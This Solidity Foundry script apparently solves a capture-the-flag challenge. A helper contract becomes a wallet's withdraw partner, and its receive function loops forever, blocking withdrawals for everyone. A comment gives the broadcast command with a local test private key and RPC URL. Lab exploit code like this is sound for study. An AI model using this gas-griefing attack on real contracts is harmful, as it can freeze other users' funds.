// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function setWithdrawPartner(address _partner) external;
    function contractBalance() external view returns (uint256);
    function withdraw() external;
    function partner() external view returns (address);
}

contract Helper {

    function trigger(address target) public {
        ITarget(target).setWithdrawPartner(address(this));
    }
    receive() external payable {
        uint256 a = 0;
        while(true){
            a+=1;
            a-=1;
        }
    }
}
contract SolveScript is Script {
    address public target = 0xe73bc5BD4763A3307AB5F8F126634b7E12E3dA9b;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        Helper helper = new Helper();
        helper.trigger(target);
        console.log("helper address : %s", address(helper));
        console.log("target partner : %s", ITarget(target).partner());
        vm.stopBroadcast();
    }
}
